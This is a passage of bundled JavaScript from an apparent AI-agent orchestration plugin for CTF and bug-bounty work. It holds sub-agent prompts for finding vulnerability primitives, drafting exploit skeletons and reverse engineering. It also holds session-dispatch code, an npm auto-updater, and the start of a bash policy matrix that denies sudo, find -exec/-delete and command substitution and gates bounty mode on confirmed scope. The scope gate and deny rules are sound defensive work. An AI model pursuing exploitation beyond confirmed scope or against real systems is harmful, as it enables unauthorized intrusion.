      `UniqueFocus: hypothesis-${i + 1} single cheapest disconfirm test execution`,
      `DoNotCover: ${hypotheses.slice(0, 3).map((_other, index) => index + 1).filter((index) => index !== i + 1).map((index) => `tests assigned to hypothesis-${index}`).slice(0, 4).join("; ")}`,
      "",
      `[Parallel HYPOTHESIS track ${i + 1}]`,
      ``,
      `Hypothesis: ${h.hypothesis}`,
      ``,
      `Execute the cheapest disconfirm test:`,
      h.disconfirmTest,
      ``,
      `Rules:`,
      `- Do exactly 1 test.`,
      `- Record observation.`,
      `- State whether hypothesis is SUPPORTED, REFUTED, or INCONCLUSIVE.`,
      `- Do NOT run tests assigned to other hypothesis tracks in this dispatch.`,
      `- Do NOT proceed beyond this single test.`
    ].join(`
`)
  }));
  return { tracks, label: "hypothesis-test" };
}
function planDeepWorkerDispatch(state, config2, goal) {
  const target = state.targetType;
  const trimmedGoal = goal.trim();
  const basePrompt = trimmedGoal ? `[Parallel DEEP-WORK track]

Goal:
${trimmedGoal.slice(0, 2000)}

` : `[Parallel DEEP-WORK track]

`;
  if (state.mode === "BOUNTY" && !state.scopeConfirmed) {
    return {
      label: "deep-scope",
      tracks: [
        {
          purpose: "scope-first",
          agent: "bounty-scope",
          prompt: withPromptContract("scope-first deep worker path for unconfirmed bounty scope", [
            "Bounty triage hypothesis expansion",
            "Bounty research external vulnerability mapping"
          ], `${basePrompt}Scope is not confirmed. Do scope-first triage only and stop.`)
        }
      ]
    };
  }
  if (state.mode === "BOUNTY") {
    return {
      label: `deep-bounty-${target.toLowerCase()}`,
      tracks: [
        {
          purpose: "bounty-triage",
          agent: "bounty-triage",
          prompt: withPromptContract("bounty-triage deep worker focused on scope-safe evidence triage", [
            "Bounty research external pattern mining",
            "Budget-compact note compaction"
          ], `${basePrompt}Do scope-safe triage. Prefer read-only evidence and minimal-impact validation steps. Return 2-3 concrete hypotheses and ONE next TODO.`)
        },
        {
          purpose: "bounty-research",
          agent: "bounty-research",
          prompt: withPromptContract("bounty-research deep worker focused on external CVE/config/misuse patterns", [
            "Bounty triage local evidence collection",
            "Budget-compact note compaction"
          ], `${basePrompt}Do scope-safe vulnerability research (CVE/config/misuse patterns). Return 2-3 hypotheses + cheapest minimal-impact validations.`)
        },
        {
          purpose: "budget-compact",
          agent: "md-scribe",
          prompt: withPromptContract("budget-compact focused on compressing durable notes and context transfer", [
            "Bounty triage evidence gathering",
            "Bounty research vulnerability hypothesis generation"
          ], `${basePrompt}If notes are noisy/long, compact durable notes and return a concise CONTEXT_PACK style summary for safe continuation.`)
        }
      ]
    };
  }
  if (target !== "PWN" && target !== "REV") {
    const plan = planScanDispatch(state, config2, trimmedGoal);
    return { ...plan, label: `deep-${target.toLowerCase()}` };
  }
  const tracks = target === "PWN" ? [
    {
      purpose: "pwn-primitive",
      agent: "ctf-pwn",
      prompt: withPromptContract("pwn-primitive focused on vulnerability class and exploitation primitive identification", [
        "exploit-skeleton drafting and validation loop design",
        "env-parity confirmation and environment assumptions",
        "research-technique external pattern lookup"
      ], `${basePrompt}Find the vulnerability class + exploitation primitive. Provide deterministic repro steps and the cheapest next test.`)
    },
    {
      purpose: "exploit-skeleton",
      agent: "ctf-solve",
      prompt: withPromptContract("exploit-skeleton focused on minimal reliable exploit scaffold and validation loop", [
        "pwn-primitive vulnerability classification",
        "env-parity environment parity confirmations",
        "research-technique external writeup and CVE mining"
      ], `${basePrompt}Draft an exploit skeleton and a minimal validation loop (local first). Focus on reliability and evidence.`)
    },
    {
      purpose: "env-parity",
      agent: "ctf-explore",
      prompt: withPromptContract("env-parity focused on arch/protection/libc-loader/remote constraint parity", [
        "pwn-primitive vulnerability classification",
        "exploit-skeleton exploit draft authoring",
        "research-technique external pattern research"
      ], `${basePrompt}Check environment parity assumptions (arch, protections, libc/loader, remote constraints). List cheapest confirmations.`)
    },
    {
      purpose: "research-technique",
      agent: "ctf-research",
      prompt: withPromptContract("research-technique focused on external PWN pattern and exploitation prior-art research", [
        "pwn-primitive local vulnerability classification",
        "exploit-skeleton local exploit drafting",
        "env-parity local environment verification"
      ], `${basePrompt}Search for similar PWN patterns and likely exploitation techniques. Return top 3 hypotheses + cheapest disconfirm tests.`)
    }
  ] : [
    {
      purpose: "rev-static",
      agent: "ctf-rev",
      prompt: withPromptContract("rev-static focused on static structure, key logic map, checks, and constraints", [
        "rev-dynamic runtime observation and trace collection",
        "rev-instrument instrumentation or patch proposal",
        "research-obfuscation external VM/packer prior-art research"
      ], `${basePrompt}Do static analysis: locate key logic, inputs, checks, and candidate constraints. Return top observations and likely pivot points.`)
    },
    {
      purpose: "rev-dynamic",
      agent: "ctf-explore",
      prompt: withPromptContract("rev-dynamic focused on runtime-grounded probing and concrete artifact capture", [
        "rev-static deep static decompilation and logic reconstruction",
        "rev-instrument proposing or applying instrumentation patches",
        "research-obfuscation external obfuscation technique research"
      ], `${basePrompt}Do dynamic/runtime-grounded probing (run traces, observe behavior, inputs/outputs). Return concrete evidence artifacts to collect.`)
    },
    {
      purpose: "rev-instrument",
      agent: "ctf-rev",
      prompt: withPromptContract("rev-instrument focused on cheapest instrumentation or patch to dump runtime values", [
        "rev-static full static solve attempts",
        "rev-dynamic broad runtime recon without instrumentation design",
        "research-obfuscation external writeup synthesis"
      ], `${basePrompt}Propose the cheapest instrumentation/patch to dump runtime-expected values (avoid full solve). Provide exact next TODO.`)
    },
    {
      purpose: "research-obfuscation",
      agent: "ctf-research",
      prompt: withPromptContract("research-obfuscation focused on external VM/packer/anti-debug technique research", [
        "rev-static local binary static analysis",
        "rev-dynamic local runtime probing",
        "rev-instrument local instrumentation and patch planning"
      ], `${basePrompt}Research similar REV patterns (VM/packer/anti-debug) and list 2-3 likely techniques + cheapest validations.`)
    }
  ];
  return { tracks, label: `deep-${target.toLowerCase()}` };
}
var hasError = hasErrorResponse;
function extractSessionIdFromResponse(response) {
  if (typeof response === "string" && response.trim().length > 0) {
    return response.trim();
  }
  if (!response || typeof response !== "object") {
    return null;
  }
  const root = response;
  const data = root.data && typeof root.data === "object" ? root.data : null;
  const info = data?.info && typeof data.info === "object" ? data.info : null;
  const rootInfo = root.info && typeof root.info === "object" ? root.info : null;
  const dataSession = data?.session && typeof data.session === "object" ? data.session : null;
  const rootSession = root.session && typeof root.session === "object" ? root.session : null;
  const properties = root.properties && typeof root.properties === "object" ? root.properties : null;
  const propertiesInfo = properties?.info && typeof properties.info === "object" ? properties.info : null;
  const candidates = [
    data?.id,
    data?.sessionID,
    data?.sessionId,
    data?.session_id,
    info?.id,
    info?.sessionID,
    info?.sessionId,
    info?.session_id,
    rootInfo?.id,
    rootInfo?.sessionID,
    rootInfo?.sessionId,
    rootInfo?.session_id,
    dataSession?.id,
    dataSession?.sessionID,
    dataSession?.sessionId,
    rootSession?.id,
    rootSession?.sessionID,
    rootSession?.sessionId,
    propertiesInfo?.id,
    propertiesInfo?.sessionID,
    propertiesInfo?.sessionId,
    root.id,
    root.sessionID,
    root.sessionId,
    root.session_id
  ];
  for (const candidate of candidates) {
    if (typeof candidate === "string" && candidate.trim().length > 0) {
      return candidate.trim();
    }
  }
  return null;
}
function summarizeCreateAttemptResult(result) {
  if (result === null)
    return "result=null";
  if (result === undefined)
    return "result=undefined";
  if (typeof result === "string")
    return `result=string(len=${result.length})`;
  if (typeof result !== "object")
    return `result=${typeof result}`;
  const root = result;
  const rootKeys = Object.keys(root).slice(0, 6).join(",");
  const data = root.data && typeof root.data === "object" ? root.data : null;
  const dataKeys = data ? Object.keys(data).slice(0, 6).join(",") : "";
  const id = extractSessionIdFromResponse(result);
  if (id)
    return `id=${id}`;
  return `rootKeys=[${rootKeys}] dataKeys=[${dataKeys}]`;
}
async function callSessionCreateId(sessionClient, directory, parentID, title) {
  const tryExtract = (result) => {
    if (hasError(result)) {
      return null;
    }
    return extractSessionIdFromResponse(result);
  };
  const failures = [];
  const attemptCreate = async (label, payload) => {
    try {
      const result = await sessionClient.create(payload);
      const id = tryExtract(result);
      if (id)
        return id;
      failures.push(`${label}: no-id (${summarizeCreateAttemptResult(result)})`);
      return null;
    } catch (error48) {
      failures.push(`${label}: ${error48 instanceof Error ? error48.message : String(error48)}`);
      return null;
    }
  };
  const attemptFork = async (label, payload) => {
    if (typeof sessionClient.fork !== "function") {
      return null;
    }
    try {
      const result = await sessionClient.fork(payload);
      const id = tryExtract(result);
      if (id)
        return id;
      failures.push(`${label}: no-id (${summarizeCreateAttemptResult(result)})`);
      return null;
    } catch (error48) {
      failures.push(`${label}: ${error48 instanceof Error ? error48.message : String(error48)}`);
      return null;
    }
  };
  const attempts = [
    () => attemptCreate("create-query-body-parentID", {
      query: { directory },
      body: { parentID, title }
    }),
    () => attemptCreate("create-query-body-parentId", {
      query: { directory },
      body: { parentId: parentID, title }
    }),
    () => attemptCreate("create-flat-parentID", { directory, parentID, title }),
    () => attemptCreate("create-flat-parentId", { directory, parentId: parentID, title }),
    () => attemptCreate("create-query-body-no-parent", {
      query: { directory },
      body: { title }
    }),
    () => attemptCreate("create-flat-no-parent", { directory, title }),
    () => attemptFork("fork-path-id-query", {
      path: { id: parentID },
      query: { directory },
      body: {}
    }),
    () => attemptFork("fork-path-sessionID-query", {
      path: { sessionID: parentID },
      query: { directory },
      body: {}
    }),
    () => attemptFork("fork-flat-sessionID", { sessionID: parentID, directory }),
    () => attemptFork("fork-flat-id", { id: parentID, directory }),
    () => attemptCreate("create-body-title", { body: { title } }),
    () => attemptCreate("create-empty", {})
  ];
  for (const attempt of attempts) {
    const id = await attempt();
    if (id) {
      return { sessionID: id };
    }
  }
  const failure = failures.length > 0 ? failures.join(" | ").slice(0, 1200) : "unknown";
  return { sessionID: null, failure };
}
async function callSessionPromptAsync(sessionClient, sessionID, directory, agent, prompt, system) {
  const body = {
    agent,
    system,
    tools: {
      task: false,
      background_task: false
    },
    parts: [{ type: "text", text: prompt }]
  };
  try {
    const primary = await sessionClient.promptAsync({
      path: { id: sessionID },
      query: { directory },
      body
    });
    if (!hasError(primary))
      return true;
  } catch (error48) {
    debugLog("parallel", `promptAsync primary failed session=${sessionID}`, error48);
  }
  try {
    const fallback = await sessionClient.promptAsync({
      sessionID,
      directory,
      agent,
      system,
      tools: body.tools,
      parts: body.parts
    });
    return !hasError(fallback);
  } catch (error48) {
    debugLog("parallel", `promptAsync fallback failed session=${sessionID}`, error48);
    return false;
  }
}
async function callSessionMessagesData(sessionClient, sessionID, directory, limit) {
  try {
    const primary = await sessionClient.messages({
      path: { id: sessionID },
      query: { directory, limit }
    });
    if (Array.isArray(primary?.data) && !hasError(primary))
      return primary.data;
  } catch (error48) {
    debugLog("parallel", `messages primary failed session=${sessionID}`, error48);
  }
  try {
    const fallback = await sessionClient.messages({ sessionID, directory, limit });
    if (Array.isArray(fallback?.data) && !hasError(fallback))
      return fallback.data;
  } catch (error48) {
    debugLog("parallel", `messages fallback failed session=${sessionID}`, error48);
  }
  return null;
}
async function callSessionAbort(sessionClient, sessionID, directory) {
  try {
    const primary = await sessionClient.abort({ path: { id: sessionID }, query: { directory } });
    if (!hasError(primary))
      return true;
  } catch (error48) {
    debugLog("parallel", `abort primary failed session=${sessionID}`, error48);
  }
  try {
    const fallback = await sessionClient.abort({ sessionID, directory });
    return !hasError(fallback);
  } catch (error48) {
    debugLog("parallel", `abort fallback failed session=${sessionID}`, error48);
    return false;
  }
}
function extractSessionClient(client) {
  if (!client || typeof client !== "object")
    return null;
  const c = client;
  const session = c.session;
  if (!session || typeof session !== "object")
    return null;
  const s = session;
  const hasCreate = typeof s.create === "function";
  const hasPromptAsync = typeof s.promptAsync === "function";
  const hasMessages = typeof s.messages === "function";
  const hasAbort = typeof s.abort === "function";
  const hasFork = typeof s.fork === "function";
  const hasStatus = typeof s.status === "function";
  const hasChildren = typeof s.children === "function";
  if (!hasCreate || !hasPromptAsync || !hasMessages || !hasAbort) {
    return null;
  }
  const bindSessionMethod = (fn, fallback) => {
    if (typeof fn !== "function")
      return fallback;
    return fn.bind(session);
  };
  const create = bindSessionMethod(s.create, async () => ({ error: true }));
  const promptAsync = bindSessionMethod(s.promptAsync, async () => ({ error: true }));
  const messages = bindSessionMethod(s.messages, async () => ({ error: true }));
  const abort = bindSessionMethod(s.abort, async () => ({ error: true }));
  const fork = hasFork ? bindSessionMethod(s.fork, async () => ({ error: true })) : undefined;
  const status = hasStatus ? bindSessionMethod(s.status, async () => ({ data: {} })) : async () => ({ data: {} });
  const children = hasChildren ? bindSessionMethod(s.children, async () => ({ data: undefined })) : async () => ({ data: undefined });
  return {
    create,
    promptAsync,
    messages,
    fork,
    abort,
    status,
    children
  };
}
async function dispatchParallel(sessionClient, parentSessionID, directory, plan, maxTracks, options) {
  const parallelConfig = options?.parallel;
  const capDefault = parallelConfig?.max_concurrent_per_provider ?? 2;
  const providerCaps = parallelConfig?.provider_caps ?? {};
  const queueEnabled = parallelConfig?.queue_enabled ?? true;
  const state = options?.state;
  const modelCooldownMs = 300000;
  const modelHealthByModel = cloneModelHealth(state);
  const dispatchHealthBySubagent = cloneDispatchHealth(state);
  const group = {
    parentSessionID,
    label: plan.label,
    tracks: [],
    queue: [],
    parallel: {
      capDefault,
      providerCaps,
      queueEnabled
    },
    createdAt: Date.now(),
    completedAt: 0,
    winnerSessionID: "",
    winnerRationale: "",
    maxTracks
  };
  const tracksToDispatch = plan.tracks.slice(0, maxTracks).map((trackPlan, index) => ({ ...trackPlan, _index: index })).sort((a, b) => {
    const aKey = trackPlanSortKey(a);
    const bKey = trackPlanSortKey(b);
    return aKey.localeCompare(bKey);
  });
  const activeByProvider = {};
  for (const indexedPlan of tracksToDispatch) {
    const rawPlan = {
      purpose: indexedPlan.purpose,
      agent: indexedPlan.agent,
      prompt: indexedPlan.prompt
    };
    const resolved = resolveHealthyAgentForTrack(rawPlan, state, modelCooldownMs);
    const trackPlan = resolved.trackPlan;
    const provider = resolved.provider;
    const cap = effectiveProviderCap(provider, capDefault, providerCaps, modelHealthByModel, dispatchHealthBySubagent);
    if (state) {
      const candidateModel = agentModel(trackPlan.agent);
      const unhealthyModel = unresolvedModelIsUnhealthy(state, candidateModel, modelCooldownMs);
      const unhealthySubagent = isSubagentUnhealthy(state, trackPlan.agent);
      if (!resolved.canDispatch || unhealthyModel || unhealthySubagent) {
        group.queue.push(rawPlan);
        continue;
      }
    }
    if (queueEnabled && cap > 0 && (activeByProvider[provider] ?? 0) >= cap) {
      group.queue.push(trackPlan);
      continue;
    }
    const track = {
      sessionID: "",
      purpose: trackPlan.purpose,
      agent: trackPlan.agent,
      provider,
      prompt: trackPlan.prompt,
      status: "pending",
      createdAt: Date.now(),
      completedAt: 0,
      result: "",
      isWinner: false
    };
    try {
      const title = `[Aegis Parallel] ${plan.label} / ${trackPlan.purpose}`;
      const createResult = await callSessionCreateId(sessionClient, directory, parentSessionID, title);
      const sessionID = createResult.sessionID;
      if (!sessionID) {
        track.status = "failed";
        track.result = createResult.failure ? `Failed to create child session (no ID returned): ${createResult.failure}` : "Failed to create child session (no ID returned)";
        group.tracks.push(track);
        continue;
      }
      track.sessionID = sessionID;
      track.status = "running";
      const prompted = await callSessionPromptAsync(sessionClient, sessionID, directory, trackPlan.agent, trackPlan.prompt, options?.systemPrompt);
      if (!prompted) {
        track.status = "failed";
        track.result = "Failed to prompt child session (promptAsync error)";
      }
      group.tracks.push(track);
      activeByProvider[provider] = (activeByProvider[provider] ?? 0) + 1;
    } catch (error48) {
      track.status = "failed";
      track.result = `Dispatch error: ${error48 instanceof Error ? error48.message : String(error48)}`;
      group.tracks.push(track);
    }
  }
  const existing = groupsByParent.get(parentSessionID) ?? [];
  existing.push(group);
  groupsByParent.set(parentSessionID, existing);
  persistParallelGroups();
  return group;
}
async function dispatchQueuedTracks(sessionClient, group, directory, systemPrompt) {
  if (!group.parallel.queueEnabled)
    return 0;
  if (group.queue.length === 0)
    return 0;
  const activeByProvider = {};
  for (const t of group.tracks) {
    if (t.status !== "running" && t.status !== "pending")
      continue;
    activeByProvider[t.provider] = (activeByProvider[t.provider] ?? 0) + 1;
  }
  const capDefault = group.parallel.capDefault;
  const providerCaps = group.parallel.providerCaps;
  const capFor = (provider) => providerCaps[provider] ?? capDefault;
  let dispatched = 0;
  let progressed = true;
  while (progressed && group.queue.length > 0) {
    progressed = false;
    for (let i = 0;i < group.queue.length; i += 1) {
      const trackPlan = group.queue[i];
      const provider = providerForAgent(trackPlan.agent);
      const cap = capFor(provider);
      if (cap > 0 && (activeByProvider[provider] ?? 0) >= cap) {
        continue;
      }
      group.queue.splice(i, 1);
      const track = {
        sessionID: "",
        purpose: trackPlan.purpose,
        agent: trackPlan.agent,
        provider,
        prompt: trackPlan.prompt,
        status: "pending",
        createdAt: Date.now(),
        completedAt: 0,
        result: "",
        isWinner: false
      };
      try {
        const title = `[Aegis Parallel] ${group.label} / ${trackPlan.purpose}`;
        const createResult = await callSessionCreateId(sessionClient, directory, group.parentSessionID, title);
        const sessionID = createResult.sessionID;
        if (!sessionID) {
          track.status = "failed";
          track.result = createResult.failure ? `Failed to create child session (no ID returned): ${createResult.failure}` : "Failed to create child session (no ID returned)";
          group.tracks.push(track);
          progressed = true;
          dispatched += 1;
          break;
        }
        track.sessionID = sessionID;
        track.status = "running";
        const prompted = await callSessionPromptAsync(sessionClient, sessionID, directory, trackPlan.agent, trackPlan.prompt, systemPrompt);
        if (!prompted) {
          track.status = "failed";
          track.result = "Failed to prompt child session (promptAsync error)";
        }
        group.tracks.push(track);
        activeByProvider[provider] = (activeByProvider[provider] ?? 0) + 1;
        progressed = true;
        dispatched += 1;
        break;
      } catch (error48) {
        track.status = "failed";
        track.result = `Dispatch error: ${error48 instanceof Error ? error48.message : String(error48)}`;
        group.tracks.push(track);
        progressed = true;
        dispatched += 1;
        break;
      }
    }
  }
  if (dispatched > 0) {
    persistParallelGroupsDeferred();
  }
  return dispatched;
}
async function collectResults(sessionClient, group, directory, messageLimit = 5, options) {
  const results = [];
  const parsedByTrack = [];
  const quarantinedSessionIDs = [];
  const idleSessionIDs = options?.idleSessionIDs;
  for (const track of group.tracks) {
    if (!track.sessionID || track.status === "failed" || track.status === "aborted") {
      results.push({
        sessionID: track.sessionID,
        purpose: track.purpose,
        agent: track.agent,
        status: track.status,
        messages: [],
        lastAssistantMessage: track.result || "(no result)"
      });
      continue;
    }
    try {
      const data = await callSessionMessagesData(sessionClient, track.sessionID, directory, messageLimit);
      const initial = extractMessagesAndLastAssistant(data);
      const msgs = initial.messages;
      let lastAssistant = initial.lastAssistant;
      let structured = lastAssistant ? parseStructuredResult(lastAssistant) : null;
      if (!structured && lastAssistant) {
        const reaskPrompted = await callSessionPromptAsync(sessionClient, track.sessionID, directory, track.agent, REASK_JSON_ONLY_PROMPT);
        if (reaskPrompted) {
          const retryData = await callSessionMessagesData(sessionClient, track.sessionID, directory, messageLimit);
          const retried = extractMessagesAndLastAssistant(retryData);
          if (retried.messages.length > 0) {
            msgs.push(...retried.messages);
          }
          if (retried.lastAssistant) {
            lastAssistant = retried.lastAssistant;
            structured = parseStructuredResult(lastAssistant);
          }
        }
      }
      if (!structured && lastAssistant) {
        quarantinedSessionIDs.push(track.sessionID);
      } else if (structured) {
        parsedByTrack.push(structured);
      }
      if (lastAssistant) {
        track.result = lastAssistant.slice(0, 2000);
        track.status = "completed";
        track.completedAt = Date.now();
      } else if (idleSessionIDs && idleSessionIDs.has(track.sessionID)) {
        track.result = track.result || "(idle; no assistant text message found)";
        track.status = "completed";
        track.completedAt = Date.now();
      }
      results.push({
        sessionID: track.sessionID,
        purpose: track.purpose,
        agent: track.agent,
        status: track.status,
        messages: msgs,
        lastAssistantMessage: lastAssistant.slice(0, 2000)
      });
    } catch (error48) {
      results.push({
        sessionID: track.sessionID,
        purpose: track.purpose,
        agent: track.agent,
        status: "failed",
        messages: [],
        lastAssistantMessage: `Collection error: ${error48 instanceof Error ? error48.message : String(error48)}`
      });
    }
  }
  const allTracksDone = group.tracks.every((t) => t.status === "completed" || t.status === "failed" || t.status === "aborted");
  const allDone = allTracksDone && group.queue.length === 0;
  if (allDone && group.completedAt === 0) {
    group.completedAt = Date.now();
  }
  persistParallelGroupsDeferred();
  return {
    results,
    merged: mergeStructuredResults(parsedByTrack),
    quarantinedSessionIDs
  };
}
async function abortTrack(sessionClient, group, sessionID, directory) {
  const track = group.tracks.find((t) => t.sessionID === sessionID);
  if (!track)
    return false;
  if (track.status === "aborted" || track.status === "completed" || track.status === "failed") {
    return false;
  }
  try {
    const ok = await callSessionAbort(sessionClient, sessionID, directory);
    if (!ok) {
      return false;
    }
    track.status = "aborted";
    track.completedAt = Date.now();
    persistParallelGroupsDeferred();
    return true;
  } catch (error48) {
    debugLog("parallel", `abortTrack failed session=${sessionID}`, error48);
    return false;
  }
}
async function abortAllExcept(sessionClient, group, winnerSessionID, directory, winnerRationale) {
  let aborted2 = 0;
  if (group.queue.length > 0) {
    aborted2 += group.queue.length;
    group.queue = [];
  }
  for (const track of group.tracks) {
    if (track.sessionID === winnerSessionID) {
      track.isWinner = true;
      continue;
    }
    if (track.status !== "running" && track.status !== "pending")
      continue;
    const ok = await abortTrack(sessionClient, group, track.sessionID, directory);
    if (ok)
      aborted2 += 1;
  }
  group.winnerSessionID = winnerSessionID;
  group.winnerRationale = typeof winnerRationale === "string" ? winnerRationale.trim().slice(0, 240) : "";
  group.completedAt = Date.now();
  persistParallelGroupsDeferred();
  return aborted2;
}
async function abortAll(sessionClient, group, directory) {
  let aborted2 = 0;
  if (group.queue.length > 0) {
    aborted2 += group.queue.length;
    group.queue = [];
  }
  for (const track of group.tracks) {
    if (track.status !== "running" && track.status !== "pending")
      continue;
    const ok = await abortTrack(sessionClient, group, track.sessionID, directory);
    if (ok)
      aborted2 += 1;
  }
  group.completedAt = Date.now();
  persistParallelGroupsDeferred();
  return aborted2;
}
function groupSummary(group) {
  return {
    label: group.label,
    parentSessionID: group.parentSessionID,
    createdAt: new Date(group.createdAt).toISOString(),
    completedAt: group.completedAt > 0 ? new Date(group.completedAt).toISOString() : null,
    winnerSessionID: group.winnerSessionID || null,
    winnerRationale: group.winnerRationale && group.winnerRationale.trim().length > 0 ? group.winnerRationale : null,
    maxTracks: group.maxTracks,
    queued: group.queue.length,
    tracks: group.tracks.map((t) => ({
      sessionID: t.sessionID,
      purpose: t.purpose,
      agent: t.agent,
      status: t.status,
      isWinner: t.isWinner,
      resultPreview: t.result ? t.result.slice(0, 200) : null
    }))
  };
}

// src/install/npm-auto-update.ts
import { execFileSync } from "child_process";
import { existsSync as existsSync6, mkdirSync as mkdirSync2, readFileSync as readFileSync6, writeFileSync as writeFileSync2 } from "fs";
import { dirname as dirname3, join as join7, resolve as resolve2 } from "path";
var STATE_FILE = join7(".Aegis", "npm-auto-update-state.json");
var DEFAULT_INTERVAL_MS = 1000 * 60 * 60 * 6;
function run(command, args, cwd, timeoutMs) {
  try {
    const out = execFileSync(command, args, {
      cwd,
      encoding: "utf-8",
      stdio: ["ignore", "pipe", "pipe"],
      timeout: timeoutMs,
      env: {
        ...process.env,
        GIT_TERMINAL_PROMPT: "0"
      }
    });
    return { ok: true, stdout: out.trim(), stderr: "" };
  } catch (error48) {
    const stderr = error48 && typeof error48 === "object" && "stderr" in error48 && typeof error48.stderr === "string" ? String(error48.stderr).trim() : "";
    return { ok: false, stdout: "", stderr };
  }
}
function readJson(path) {
  if (!existsSync6(path))
    return null;
  try {
    const parsed = JSON.parse(readFileSync6(path, "utf-8"));
    if (!parsed || typeof parsed !== "object" || Array.isArray(parsed))
      return null;
    return parsed;
  } catch {
    return null;
  }
}
function writeState(path, state) {
  mkdirSync2(dirname3(path), { recursive: true });
  writeFileSync2(path, `${JSON.stringify(state, null, 2)}
`, "utf-8");
}
function readState(path) {
  const raw = readJson(path);
  if (!raw)
    return null;
  return {
    lastCheckedAt: typeof raw.lastCheckedAt === "number" && Number.isFinite(raw.lastCheckedAt) ? raw.lastCheckedAt : 0,
    lastStatus: typeof raw.lastStatus === "string" ? raw.lastStatus : "failed",
    lastLocalVersion: typeof raw.lastLocalVersion === "string" ? raw.lastLocalVersion : "",
    lastLatestVersion: typeof raw.lastLatestVersion === "string" ? raw.lastLatestVersion : ""
  };
}
function parseIntervalMs(env) {
  const raw = env.AEGIS_NPM_AUTO_UPDATE_INTERVAL_MINUTES;
  if (!raw)
    return DEFAULT_INTERVAL_MS;
  const minutes = Number(raw);
  if (!Number.isFinite(minutes) || minutes < 1)
    return DEFAULT_INTERVAL_MS;
  return Math.floor(minutes) * 60 * 1000;
}
function isNpmAutoUpdateEnabled(env = process.env) {
  const raw = (env.AEGIS_NPM_AUTO_UPDATE ?? "").trim().toLowerCase();
  if (!raw)
    return true;
  return !["0", "false", "off", "no"].includes(raw);
}
function resolveOpencodeConfigDir(env = process.env) {
  const xdg = typeof env.XDG_CONFIG_HOME === "string" && env.XDG_CONFIG_HOME.trim().length > 0 ? env.XDG_CONFIG_HOME : "";
  const home = typeof env.HOME === "string" && env.HOME.trim().length > 0 ? env.HOME : "";
  const base = xdg ? xdg : home ? join7(home, ".config") : ".";
  return resolve2(join7(base, "opencode"));
}
function readInstalledVersion(installDir, packageName) {
  const pkgPath = join7(installDir, "node_modules", packageName, "package.json");
  const raw = readJson(pkgPath);
  const v = raw && typeof raw.version === "string" ? raw.version.trim() : "";
  return v.length > 0 ? v : null;
}
async function resolveLatestViaNpm(packageName, installDir, deps) {
  const r = (deps?.runImpl ?? run)("npm", ["view", packageName, "version"], installDir, 1e4);
  const v = r.ok ? r.stdout.trim() : "";
  return v.length > 0 ? v : null;
}
async function maybeNpmAutoUpdatePackage(options) {
  const env = options.env ?? process.env;
  if (!isNpmAutoUpdateEnabled(env)) {
    return {
      status: "disabled",
      installDir: null,
      detail: "disabled by AEGIS_NPM_AUTO_UPDATE",
      localVersion: null,
      latestVersion: null
    };
  }
  const installDir = options.installDir ? resolve2(options.installDir) : resolveOpencodeConfigDir(env);
  if (!installDir || !existsSync6(installDir)) {
    return {
      status: "no_install_dir",
      installDir: installDir || null,
      detail: "install dir not found",
      localVersion: null,
      latestVersion: null
    };
  }
  const packageJsonPath = join7(installDir, "package.json");
  if (!existsSync6(packageJsonPath)) {
    return {
      status: "no_package_json",
      installDir,
      detail: "package.json not found; skipping npm auto-update",
      localVersion: null,
      latestVersion: null
    };
  }
  const now = (options.deps?.nowImpl ?? Date.now)();
  const statePath = join7(installDir, STATE_FILE);
  const intervalMs = parseIntervalMs(env);
  const prior = readState(statePath);
  if (!options.force && prior && now - prior.lastCheckedAt < intervalMs) {
    return {
      status: "throttled",
      installDir,
      detail: "skipped by throttle window",
      localVersion: prior.lastLocalVersion || null,
      latestVersion: prior.lastLatestVersion || null
    };
  }
  const localVersion = options.currentVersion?.trim().length ? options.currentVersion.trim() : readInstalledVersion(installDir, options.packageName);
  const resolveLatest = options.deps?.resolveLatest ?? ((pkg, dir) => resolveLatestViaNpm(pkg, dir, { runImpl: options.deps?.runImpl }));
  const latestVersion = await resolveLatest(options.packageName, installDir);
  if (!latestVersion) {
    writeState(statePath, {
      lastCheckedAt: now,
      lastStatus: "failed",
      lastLocalVersion: localVersion ?? "",
      lastLatestVersion: ""
    });
    return {
      status: "failed",
      installDir,
      detail: "failed to resolve npm latest version",
      localVersion,
      latestVersion: null
    };
  }
  if (localVersion && localVersion === latestVersion) {
    writeState(statePath, {
      lastCheckedAt: now,
      lastStatus: "up_to_date",
      lastLocalVersion: localVersion,
      lastLatestVersion: latestVersion
    });
    return {
      status: "up_to_date",
      installDir,
      detail: "already up to date",
      localVersion,
      latestVersion
    };
  }
  const runImpl = options.deps?.runImpl ?? run;
  const install = runImpl("npm", ["install", "--prefer-online", `${options.packageName}@latest`], installDir, 60000);
  if (!install.ok) {
    writeState(statePath, {
      lastCheckedAt: now,
      lastStatus: "failed",
      lastLocalVersion: localVersion ?? "",
      lastLatestVersion: latestVersion
    });
    if (!options.silent) {
      process.stderr.write(`[oh-my-aegis] npm auto-update failed: ${install.stderr || "unknown error"}
`);
    }
    return {
      status: "failed",
      installDir,
      detail: `npm install failed: ${install.stderr || "unknown error"}`,
      localVersion,
      latestVersion
    };
  }
  const installedAfter = readInstalledVersion(installDir, options.packageName);
  const updatedOk = Boolean(installedAfter && installedAfter === latestVersion);
  writeState(statePath, {
    lastCheckedAt: now,
    lastStatus: updatedOk ? "updated" : "failed",
    lastLocalVersion: installedAfter ?? localVersion ?? "",
    lastLatestVersion: latestVersion
  });
  return {
    status: updatedOk ? "updated" : "failed",
    installDir,
    detail: updatedOk ? `updated ${options.packageName} to ${latestVersion}` : `npm install ran but version is ${installedAfter ?? "(unknown)"}`,
    localVersion: installedAfter ?? localVersion,
    latestVersion
  };
}

// src/risk/policy-matrix.ts
function evaluateBashCommand(command, config2, mode, options) {
  const containsNewline = /[\r\n]/.test(command);
  const sanitized = sanitizeCommand(command);
  const deny = (denyLevel, reason) => {
    return {
      allow: false,
      reason,
      sanitizedCommand: sanitized,
      denyLevel
    };
  };
  const denyHard = (reason) => deny("hard", reason);
  const denySoft = (reason) => deny("soft", reason);
  const readonlySegmentsBlockedReason = (reason) => {
    return denyHard(reason);
  };
  const splitReadonlySegments = (input) => {
    return input.split(/\s*(?:\|\||&&|;|\|)\s*/).map((part) => part.trim()).filter((part) => part.length > 0);
  };
  const hasForbiddenReadonlyShellSyntax = (segment) => {
    if (/[<>]/.test(segment))
      return true;
    if (segment.includes("`"))
      return true;
    if (segment.includes("$("))
      return true;
    if (/\b(sudo|doas)\b/i.test(segment))
      return true;
    if (/^find(\s|$)/i.test(segment)) {
      if (/(\s|^)-(delete|execdir|exec|okdir|ok)(\s|$)/i.test(segment))
        return true;
    }
    return false;
  };
  if (mode === "BOUNTY" && options?.scopeConfirmed !== true) {
